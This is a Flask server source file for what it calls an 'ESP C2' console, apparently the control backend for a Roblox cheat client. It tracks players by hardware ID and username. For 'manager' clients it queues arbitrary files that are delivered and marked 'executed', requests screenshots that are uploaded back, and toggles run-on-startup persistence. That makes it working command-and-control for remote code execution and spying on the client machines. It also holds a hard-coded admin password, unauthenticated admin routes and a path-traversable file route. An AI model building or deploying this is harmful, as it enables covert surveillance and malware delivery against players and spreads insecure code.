from flask import Flask, request, jsonify, render_template_string, send_file
import json
import os
import base64
from datetime import datetime, timedelta

app = Flask(__name__)

# ===== CORS support =====
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE')
    return response

# ===== Persistent storage =====
DATA_FILE = "players_data.json"
SCREENSHOT_DIR = "screenshots"
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                return json.load(f)
        except:
            pass
    return {}

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

PLAYERS = load_data()
PENDING_FILES = {}        # hwid -> {'filename': name, 'content_b64': base64, 'status': 'queued'}
screenshot_requests = {}  # hwid -> True (pending)
screenshot_files = {}     # hwid -> filename (ready for download)
startup_requests = {}     # hwid -> True/False (pending toggle)

ADMIN_PASSWORD = "admin123"  # CHANGE THIS!

def add_username(hwid, username):
    if username and username not in PLAYERS[hwid].get('usernames', []):
        PLAYERS[hwid].setdefault('usernames', []).append(username)

# ============================================
# HTML ADMIN DASHBOARD (Two tabs)
# ============================================
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>ESP C2 Admin Panel</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial; background: #0d0d0d; color: #eee; padding: 20px; }
        h1 { color: #00ff00; }
        h2 { color: #0f0; margin-top: 30px; }
        table { border-collapse: collapse; width: 100%; margin-top: 10px; font-size: 14px; }
        th, td { padding: 8px 12px; border: 1px solid #333; text-align: left; }
        th { background: #1a1a1a; color: #0f0; }
        .banned { background: #2a0a0a; color: #ff4444; }
        .active { background: #0a2a0a; color: #44ff44; }
        .offline { background: #222; color: #888; }
        .btn { padding: 4px 10px; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; }
        .btn-kick { background: #e67e22; color: white; }
        .btn-ban { background: #e74c3c; color: white; }
        .btn-unban { background: #27ae60; color: white; }
        .btn-copy { background: #3498db; color: white; }
        .btn-file { background: #9b59b6; color: white; }
        .btn-screenshot { background: #2ecc71; color: black; }
        .btn-refresh { background: #3498db; color: white; }
        .btn-startup { background: #f1c40f; color: black; }
        .btn-kick:hover { background: #f39c12; }
        .btn-ban:hover { background: #c0392b; }
        .btn-unban:hover { background: #2ecc71; }
        .btn-copy:hover { background: #2980b9; }
        .btn-file:hover { background: #8e44ad; }
        .btn-screenshot:hover { background: #27ae60; }
        .btn-refresh:hover { background: #2980b9; }
        .btn-startup:hover { background: #d4ac0d; }
        .settings-input { width: 80px; padding: 3px; background: #222; color: #fff; border: 1px solid #555; }
        .settings-btn { padding: 3px 8px; background: #3498db; color: white; border: none; border-radius: 3px; cursor: pointer; }
        .settings-btn:hover { background: #2980b9; }
        .file-upload { display: inline-flex; align-items: center; gap: 6px; flex-wrap: wrap; }
        .file-upload input[type="file"] { display: none; }
        .file-upload label { background: #9b59b6; color: white; padding: 4px 10px; border-radius: 3px; cursor: pointer; }
        .file-upload label:hover { background: #8e44ad; }
        .file-name { color: #0f0; font-size: 12px; max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .status-msg { font-size: 12px; padding: 2px 6px; border-radius: 3px; }
        .status-msg.success { color: #0f0; background: #0a2a0a; }
        .status-msg.error { color: #f00; background: #2a0a0a; }
        .status-msg.info { color: #ff0; background: #2a2a0a; }
        .file-status { font-size: 11px; color: #aaa; }
        .file-status.delivered { color: #0f0; }
        .file-status.executed { color: #0ff; }
        .screenshot-link { color: #2ecc71; text-decoration: underline; cursor: pointer; }
        .timestamp { color: #888; font-size: 0.8em; }
        .username-list { font-weight: bold; color: #0f0; }
        .refresh-section { margin-bottom: 15px; }
        .tab { overflow: hidden; border-bottom: 1px solid #333; }
        .tab button { background: inherit; float: left; border: none; outline: none; cursor: pointer; padding: 10px 16px; transition: 0.3s; color: #aaa; }
        .tab button:hover { background: #2a2a2a; color: #fff; }
        .tab button.active { background: #1a1a1a; color: #0f0; border-bottom: 2px solid #0f0; }
        .tabcontent { display: none; padding: 20px 0; }
        .tabcontent.active { display: block; }
    </style>
    <script>
        function openTab(evt, tabName) {
            var i, tabcontent, tablinks;
            tabcontent = document.getElementsByClassName("tabcontent");
            for (i = 0; i < tabcontent.length; i++) tabcontent[i].className = tabcontent[i].className.replace(" active", "");
            tablinks = document.getElementsByClassName("tablinks");
            for (i = 0; i < tablinks.length; i++) tablinks[i].className = tablinks[i].className.replace(" active", "");
            document.getElementById(tabName).className += " active";
            evt.currentTarget.className += " active";
        }
        function copyHWID(hwid) {
            navigator.clipboard.writeText(hwid).then(() => alert('HWID copied: ' + hwid));
        }
        function updateFileName(hwid) {
            const input = document.getElementById('fileInput_' + hwid);
            const label = document.getElementById('fileName_' + hwid);
            if (input.files && input.files.length > 0) label.textContent = input.files[0].name;
            else label.textContent = 'No file chosen';
            document.getElementById('statusMsg_' + hwid).textContent = '';
        }
        function setStatus(hwid, msg, type) {
            const el = document.getElementById('statusMsg_' + hwid);
            el.textContent = msg;
            el.className = 'status-msg ' + type;
            setTimeout(() => { if (el.textContent === msg) { el.textContent = ''; el.className = 'status-msg'; } }, 5000);
        }
        function uploadFile(hwid) {
            const input = document.getElementById('fileInput_' + hwid);
            const file = input.files[0];
            if (!file) {
                setStatus(hwid, 'No file selected', 'error');
                return;
            }
            setStatus(hwid, 'Uploading...', 'info');
            const reader = new FileReader();
            reader.onload = function(e) {
                const content = e.target.result;
                const base64Content = content.split(',')[1];
                fetch('/admin/upload_file', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ hwid: hwid, filename: file.name, content_b64: base64Content })
                })
                .then(res => res.json())
                .then(data => {
                    if (data.status === 'ok') {
                        setStatus(hwid, '✔ Queued', 'success');
                        input.value = '';
                        document.getElementById('fileName_' + hwid).textContent = 'No file chosen';
                    } else {
                        setStatus(hwid, '✘ ' + data.error, 'error');
                    }
                })
                .catch(err => {
                    setStatus(hwid, '✘ Network error', 'error');
                    console.error(err);
                });
            };
            reader.onerror = function(err) {
                setStatus(hwid, '✘ File read error', 'error');
                console.error(err);
            };
            reader.readAsDataURL(file);
        }
        function takeScreenshot(hwid) {
            fetch('/admin/screenshot', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ hwid: hwid })
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === 'ok') {
                    alert('Screenshot requested. Download link will appear soon.');
                } else {
                    alert('Error: ' + data.error);
                }
            })
            .catch(err => alert('Network error: ' + err));
        }
        function toggleStartup(hwid) {
            var checkbox = document.getElementById('startup_' + hwid);
            var checked = checkbox.checked;
            fetch('/admin/startup', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ hwid: hwid, enabled: checked })
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === 'ok') {
                    alert('Startup setting changed. Will take effect on next heartbeat.');
                } else {
                    alert('Error: ' + data.error);
                    checkbox.checked = !checked;
                }
            })
            .catch(err => { alert('Network error'); checkbox.checked = !checked; });
        }
        function refreshPage() { location.reload(); }
    </script>
</head>
<body>
    <h1>⚡ Attestation C2 Console</h1>
    <div class="refresh-section">
        <button class="btn btn-refresh" onclick="refreshPage()">🔄 Refresh</button>
        <span style="margin-left:15px;color:#888;">Last updated: {{ now }}</span>
    </div>

    <div class="tab">
        <button class="tablinks active" onclick="openTab(event, 'Main')">Main</button>
        <button class="tablinks" onclick="openTab(event, 'Manager')">Player Manager</button>
    </div>

    <!-- ========== TAB 1: MAIN ========== -->
    <div id="Main" class="tabcontent active">
        <p>Active players (last 20s): <span id="active-count">{{ active_players|length }}</span></p>
        <h2>📊 Active Players</h2>
        <table>
            <thead><tr><th>HWID</th><th>Username(s)</th><th>Last Seen</th><th>Status</th><th>Settings Override</th><th>Actions</th></tr></thead>
            <tbody>
            {% for hwid, data in active_players.items() %}
            <tr class="active">
                <td><code>{{ hwid[:8] }}...{{ hwid[-4:] }}</code> <button class="btn btn-copy" onclick="copyHWID('{{ hwid }}')">📋</button></td>
                <td><span class="username-list">{{ data.usernames|join(', ') }}</span></td>
                <td>{{ data.last_seen }}</td>
                <td>{{ data.status.upper() }}</td>
                <td>
                    <form method="POST" action="/admin/settings" style="display:inline;">
                        <input type="hidden" name="hwid" value="{{ hwid }}">
                        <input type="text" name="setting" placeholder="e.g. ESP_SHOW_BOX" class="settings-input" value="{{ data.settings_override.get('setting', '') }}">
                        <input type="text" name="value" placeholder="True/False" class="settings-input" value="{{ data.settings_override.get('value', '') }}">
                        <button type="submit" class="settings-btn">Set</button>
                    </form>
                </td>
                <td>
                    <form method="POST" action="/admin/kick" style="display:inline;">
                        <input type="hidden" name="hwid" value="{{ hwid }}">
                        <button type="submit" class="btn btn-kick">Kick</button>
                    </form>
                    {% if data.status == 'banned' %}
                    <form method="POST" action="/admin/unban" style="display:inline;">
                        <input type="hidden" name="hwid" value="{{ hwid }}">
                        <button type="submit" class="btn btn-unban">Unban</button>
                    </form>
                    {% else %}
                    <form method="POST" action="/admin/ban" style="display:inline;">
                        <input type="hidden" name="hwid" value="{{ hwid }}">
                        <button type="submit" class="btn btn-ban">Ban</button>
                    </form>
                    {% endif %}
                </td>
            </tr>
            {% endfor %}
            </tbody>
        </table>

        <h2>📜 All Players History</h2>
        <table>
            <thead><tr><th>HWID</th><th>Username(s)</th><th>First Seen</th><th>Last Seen</th><th>Status</th><th>Actions</th></tr></thead>
            <tbody>
            {% for hwid, data in all_players.items() %}
            <tr class="{{ 'banned' if data.status == 'banned' else 'offline' }}">
                <td><code>{{ hwid[:8] }}...{{ hwid[-4:] }}</code> <button class="btn btn-copy" onclick="copyHWID('{{ hwid }}')">📋</button></td>
                <td><span class="username-list">{{ data.usernames|join(', ') }}</span></td>
                <td>{{ data.first_seen }}</td>
                <td>{{ data.last_seen }}</td>
                <td>{{ data.status.upper() }}</td>
                <td>
                    <form method="POST" action="/admin/kick" style="display:inline;">
                        <input type="hidden" name="hwid" value="{{ hwid }}">
                        <button type="submit" class="btn btn-kick">Kick</button>
                    </form>
                    {% if data.status == 'banned' %}
                    <form method="POST" action="/admin/unban" style="display:inline;">
                        <input type="hidden" name="hwid" value="{{ hwid }}">
                        <button type="submit" class="btn btn-unban">Unban</button>
                    </form>
                    {% else %}
                    <form method="POST" action="/admin/ban" style="display:inline;">
                        <input type="hidden" name="hwid" value="{{ hwid }}">
                        <button type="submit" class="btn btn-ban">Ban</button>
                    </form>
                    {% endif %}
                </td>
            </tr>
            {% endfor %}
            </tbody>
        </table>

        <h2>👤 Users by Roblox Username</h2>
        <table>
            <thead><tr><th>Roblox Username</th><th>Associated HWIDs</th><th>First Seen</th><th>Last Seen</th></tr></thead>
            <tbody>
            {% for username, info in users.items() %}
            <tr>
                <td><strong>{{ username }}</strong></td>
                <td>
                    {% for hwid in info.hwids %}
                        <code>{{ hwid[:8] }}...{{ hwid[-4:] }}</code>{% if not loop.last %}, {% endif %}
                    {% endfor %}
                </td>
                <td>{{ info.first_seen }}</td>
                <td>{{ info.last_seen }}</td>
            </tr>
            {% endfor %}
            </tbody>
        </table>
    </div>

    <!-- ========== TAB 2: PLAYER MANAGER ========== -->
    <div id="Manager" class="tabcontent">
        <p>Manage each player individually.</p>
        <table>
            <thead><tr><th>HWID</th><th>Username(s)</th><th>Status</th><th>Send File</th><th>File Status</th><th>Screenshot</th><th>Startup</th><th>Actions</th></tr></thead>
            <tbody>
            {% for hwid, data in active_players.items() %}
            <tr class="active">
                <td><code>{{ hwid[:8] }}...{{ hwid[-4:] }}</code> <button class="btn btn-copy" onclick="copyHWID('{{ hwid }}')">📋</button></td>
                <td><span class="username-list">{{ data.usernames|join(', ') }}</span></td>
                <td>{{ data.status.upper() }}</td>
                <td>
                    <div class="file-upload">
                        <input type="file" id="fileInput_{{ hwid }}" onchange="updateFileName('{{ hwid }}')">
                        <label for="fileInput_{{ hwid }}">Choose file</label>
                        <span class="file-name" id="fileName_{{ hwid }}">No file chosen</span>
                        <button class="btn btn-file" onclick="uploadFile('{{ hwid }}')">Send</button>
                        <span class="status-msg" id="statusMsg_{{ hwid }}"></span>
                    </div>
                </td>
                <td>
                    {% set pending = pending_files.get(hwid) %}
                    {% if pending %}
                        <span class="file-status">{{ pending.filename }} ({{ pending.status }})</span>
                    {% else %}
                        <span class="file-status">No file</span>
                    {% endif %}
                </td>
                <td>
                    {% if screenshot_files.get(hwid) %}
                        <a href="/screenshots/{{ screenshot_files[hwid] }}" target="_blank" class="screenshot-link">Download</a>
                        <br><small>(click to download, then request again)</small>
                    {% else %}
                        <button class="btn btn-screenshot" onclick="takeScreenshot('{{ hwid }}')">📷 Request</button>
                    {% endif %}
                </td>
                <td>
                    <input type="checkbox" id="startup_{{ hwid }}" {% if data.get('startup', False) %}checked{% endif %} onchange="toggleStartup('{{ hwid }}')">
                    <label for="startup_{{ hwid }}">Run on startup</label>
                </td>
                <td>
                    <form method="POST" action="/admin/kick" style="display:inline;">
                        <input type="hidden" name="hwid" value="{{ hwid }}">
                        <button type="submit" class="btn btn-kick">Kick</button>
                    </form>
                    {% if data.status == 'banned' %}
                    <form method="POST" action="/admin/unban" style="display:inline;">
                        <input type="hidden" name="hwid" value="{{ hwid }}">
                        <button type="submit" class="btn btn-unban">Unban</button>
                    </form>
                    {% else %}
                    <form method="POST" action="/admin/ban" style="display:inline;">
                        <input type="hidden" name="hwid" value="{{ hwid }}">
                        <button type="submit" class="btn btn-ban">Ban</button>
                    </form>
                    {% endif %}
                </td>
            </tr>
            {% endfor %}
            </tbody>
        </table>
    </div>
</body>
</html>
"""

# ============================================
# ADMIN PANEL ROUTE
# ============================================
@app.route('/admin', methods=['GET'])
def admin_panel():
    pwd = request.args.get('pass')
    if pwd != ADMIN_PASSWORD:
        return "Unauthorized", 401

    now = datetime.now()
    active = {}
    for hwid, data in PLAYERS.items():
        last = datetime.fromisoformat(data['last_seen'])
        if (now - last).total_seconds() <= 20:
            active[hwid] = data

    all_players = PLAYERS.copy()
    users = {}
    for hwid, data in PLAYERS.items():
        for uname in data.get('usernames', []):
            if uname not in users:
                users[uname] = {
                    'hwids': [],
                    'first_seen': data['first_seen'],
                    'last_seen': data['last_seen']
                }
            if hwid not in users[uname]['hwids']:
                users[uname]['hwids'].append(hwid)
            if data['first_seen'] < users[uname]['first_seen']:
                users[uname]['first_seen'] = data['first_seen']
            if data['last_seen'] > users[uname]['last_seen']:
                users[uname]['last_seen'] = data['last_seen']

    return render_template_string(DASHBOARD_HTML,
                                   active_players=active,
                                   all_players=all_players,
                                   users=users,
                                   pending_files=PENDING_FILES,
                                   screenshot_files=screenshot_files,
                                   now=now.strftime("%H:%M:%S"))

# ============================================
# CLIENT API
# ============================================
@app.route('/register', methods=['POST'])
def register():
    data = request.json
    hwid = data.get('hwid')
    username = data.get('username', '')
    client_type = data.get('type', 'main')  # 'main' or 'manager'
    if not hwid:
        return jsonify({'error': 'missing hwid'}), 400

    now = datetime.now().isoformat()
    if hwid not in PLAYERS:
        PLAYERS[hwid] = {
            'first_seen': now,
            'last_seen': now,
            'status': 'active',
            'settings_override': {},
            'usernames': [username] if username else [],
            'startup': False
        }
    else:
        PLAYERS[hwid]['last_seen'] = now
        if username:
            add_username(hwid, username)

    status = PLAYERS[hwid]['status']
    response = {
        'status': status,
        'settings_override': PLAYERS[hwid].get('settings_override', {})
    }

    # Only send commands to 'manager' clients
    if client_type == 'manager':
        # Screenshot request
        if hwid in screenshot_requests and screenshot_requests[hwid]:
            response['screenshot'] = True
            del screenshot_requests[hwid]

        # Startup toggle
        if hwid in startup_requests:
            response['startup'] = startup_requests[hwid]
            PLAYERS[hwid]['startup'] = startup_requests[hwid]
            del startup_requests[hwid]

        # File delivery
        if hwid in PENDING_FILES and PENDING_FILES[hwid].get('status') == 'queued':
            response['file_payload'] = {
                'filename': PENDING_FILES[hwid]['filename'],
                'content_b64': PENDING_FILES[hwid]['content_b64']
            }
            PENDING_FILES[hwid]['status'] = 'delivered'
            print(f"[+] Delivered file to {hwid}: {PENDING_FILES[hwid]['filename']}")

    if status == 'kicked':
        PLAYERS[hwid]['status'] = 'active'
        PLAYERS[hwid]['settings_override'] = {}

    save_data(PLAYERS)
    return jsonify(response)

# ============================================
# ACKNOWLEDGMENT ENDPOINT
# ============================================
@app.route('/ack', methods=['POST'])
def ack():
    data = request.json
    hwid = data.get('hwid')
    filename = data.get('filename')
    status = data.get('status', 'executed')
    if hwid in PENDING_FILES and PENDING_FILES[hwid].get('filename') == filename:
        PENDING_FILES[hwid]['status'] = status
        print(f"[+] Acknowledgment from {hwid}: {filename} - {status}")
    else:
        print(f"[!] Acknowledgment from unknown: {hwid} - {filename}")
    return '', 204

# ============================================
# SCREENSHOT UPLOAD (from client)
# ============================================
@app.route('/upload_screenshot', methods=['POST'])
def upload_screenshot():
    data = request.json
    hwid = data.get('hwid')
    image_b64 = data.get('image_b64')
    if not hwid or not image_b64:
        return jsonify({'error': 'Missing data'}), 400

    filename = f"screenshot_{hwid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
    filepath = os.path.join(SCREENSHOT_DIR, filename)
    try:
        image_data = base64.b64decode(image_b64)
        with open(filepath, "wb") as f:
            f.write(image_data)
        screenshot_files[hwid] = filename
        print(f"[+] Screenshot saved for {hwid}: {filename}")
        return jsonify({'status': 'ok'})
    except Exception as e:
        print(f"[!] Screenshot save error: {e}")
        return jsonify({'error': str(e)}), 500

# ============================================
# ADMIN: REQUEST SCREENSHOT
# ============================================
@app.route('/admin/screenshot', methods=['POST'])
def request_screenshot():
    data = request.json
    hwid = data.get('hwid')
    if not hwid:
        return jsonify({'status': 'error', 'error': 'Missing HWID'}), 400
    if hwid not in PLAYERS:
        return jsonify({'status': 'error', 'error': 'HWID not found'}), 404
    if hwid in screenshot_files:
        del screenshot_files[hwid]
    screenshot_requests[hwid] = True
    print(f"[+] Screenshot requested for {hwid}")
    return jsonify({'status': 'ok'})

# ============================================
# ADMIN: TOGGLE STARTUP
# ============================================
@app.route('/admin/startup', methods=['POST'])
def toggle_startup():
    data = request.json
    hwid = data.get('hwid')
    enabled = data.get('enabled', False)
    if not hwid:
        return jsonify({'status': 'error', 'error': 'Missing HWID'}), 400
    if hwid not in PLAYERS:
        return jsonify({'status': 'error', 'error': 'HWID not found'}), 404
    startup_requests[hwid] = enabled
    print(f"[+] Startup toggle for {hwid}: {enabled}")
    return jsonify({'status': 'ok'})

# ============================================
# SERVE SCREENSHOTS
# ============================================
@app.route('/screenshots/<filename>')
def serve_screenshot(filename):
    return send_file(os.path.join(SCREENSHOT_DIR, filename))

# ============================================
# ADMIN ACTIONS
# ============================================
@app.route('/admin/ban', methods=['POST'])
def ban_player():
    hwid = request.form.get('hwid')
    if hwid in PLAYERS:
        PLAYERS[hwid]['status'] = 'banned'
        save_data(PLAYERS)
        print(f"[+] Banned {hwid}")
    return '', 204

@app.route('/admin/unban', methods=['POST'])
def unban_player():
    hwid = request.form.get('hwid')
    if hwid in PLAYERS:
        PLAYERS[hwid]['status'] = 'active'
        save_data(PLAYERS)
        print(f"[+] Unbanned {hwid}")
    return '', 204

@app.route('/admin/kick', methods=['POST'])
def kick_player():
    hwid = request.form.get('hwid')
    if hwid in PLAYERS:
        PLAYERS[hwid]['status'] = 'kicked'
        save_data(PLAYERS)
        print(f"[+] Kicked {hwid}")
    return '', 204

@app.route('/admin/settings', methods=['POST'])
def set_settings():
    hwid = request.form.get('hwid')
    setting = request.form.get('setting')
    value = request.form.get('value')
    if hwid in PLAYERS and setting and value:
        if value.lower() == 'true':
            value = True
        elif value.lower() == 'false':
            value = False
        elif value.isdigit():
            value = int(value)
        PLAYERS[hwid]['settings_override'] = {'setting': setting, 'value': value}
        save_data(PLAYERS)
        print(f"[+] Settings for {hwid}: {setting}={value}")
    return '', 204

@app.route('/admin/upload_file', methods=['POST'])
def upload_file():
    data = request.json
    hwid = data.get('hwid')
    filename = data.get('filename')
    content_b64 = data.get('content_b64')
    if not hwid or not filename or not content_b64:
        return jsonify({'status': 'error', 'error': 'Missing fields'}), 400
    if hwid not in PLAYERS:
        return jsonify({'status': 'error', 'error': 'HWID not found'}), 404
    PENDING_FILES[hwid] = {
        'filename': filename,
        'content_b64': content_b64,
        'status': 'queued'
    }
    print(f"[+] File queued for {hwid}: {filename} ({len(content_b64)} chars)")
    return jsonify({'status': 'ok'}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
